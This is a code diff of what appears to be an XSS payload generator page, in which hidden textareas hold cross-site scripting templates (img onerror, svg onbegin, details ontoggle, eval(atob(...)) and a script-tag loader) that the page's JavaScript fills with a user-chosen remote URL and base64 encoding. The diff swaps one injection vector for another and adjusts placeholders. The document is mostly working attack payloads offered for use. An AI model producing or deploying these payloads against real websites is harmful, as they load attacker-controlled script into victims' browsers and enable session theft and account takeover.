@@ -11,19 +11,22 @@
     <!-- payloads template -->
 
     <textarea id="data0"
-        hidden="true">var a=document.createElement('script');a.src='arr0w1';document.body.appendChild(a);</textarea>
+        hidden="true">var a=document.createElement('script');a.src='arr0w1_url';document.body.appendChild(a);</textarea>
 
     <textarea id="data1"
-        hidden="true">javascript:eval('var a=document.createElement(\'script\');a.src=\'arr0w1\';document.body.appendChild(a)')</textarea>
+        hidden="true">1⃣️ eval(JavaScript_content)
+eval('var a=document.createElement(\'script\');a.src=\'arr0w1_url\';document.body.appendChild(a)')
+
+2⃣️ eval(atob(JavaScript_content_BASE64encoded))
+eval(atob(arr0w1_base64))</textarea>
 
     <textarea id="data2"
-        hidden="true">"><input onfocus=eval(atob(this.id)) id=arr0w1_base64 autofocus><x id="</textarea>
+        hidden="true">"><svg style=display:none><set onbegin="arr0w1_on_event_js" dur=1s><x id="</textarea>
 
     <textarea id="data3" hidden="true">"><img src id=arr0w1_base64 onerror=eval(atob(this.id))><x id="</textarea>
 
     <textarea id="data4"
-        hidden="true">"><details open ontoggle="arr0w1_on_event_js" style="display: none"><x id="</textarea>
-
+        hidden="true">"><details open ontoggle="arr0w1_on_event_js" style=display:none></details><x id="</textarea>
     <main role="main">
         <section class="jumbotron text-center g-light">
             <div class="container">
@@ -53,7 +56,7 @@
             <br>
             <br>
             2
-            <p class="font-weight-bold">Tag - input </p>
+            <p class="font-weight-bold">Tag - svg </p>
             <textarea autofocus id="payload2" placeholder="" class="form-control" rows="3"></textarea>
 
             <br>
@@ -136,15 +139,15 @@
 
         var your_url_path = document.getElementById("your_url_path").value;
 
-        var js_code_append_a_script_tag_with_url_path = document.getElementById("data0").value.replace("arr0w1", your_url_path)
+        var js_code_append_a_script_tag_with_url_path = document.getElementById("data0").value.replace("arr0w1_url", your_url_path)
 
         var js_code_append_a_script_tag_btoa_ed = func_wise_btoa(js_code_append_a_script_tag_with_url_path);
 
         document.getElementById("payload0").value = js_code_append_a_script_tag_with_url_path;
 
-        document.getElementById("payload1").value = data1.replace("arr0w1", your_url_path);
+        document.getElementById("payload1").value = data1.replace("arr0w1_base64", js_code_append_a_script_tag_btoa_ed).replace("arr0w1_url", your_url_path);
 
-        document.getElementById("payload2").value = data2.replace("arr0w1_base64", js_code_append_a_script_tag_btoa_ed);
+        document.getElementById("payload2").value = data2.replace("arr0w1_on_event_js", js_code_append_a_script_tag_with_url_path);
 
         document.getElementById("payload3").value = data3.replace("arr0w1_base64", js_code_append_a_script_tag_btoa_ed);
 
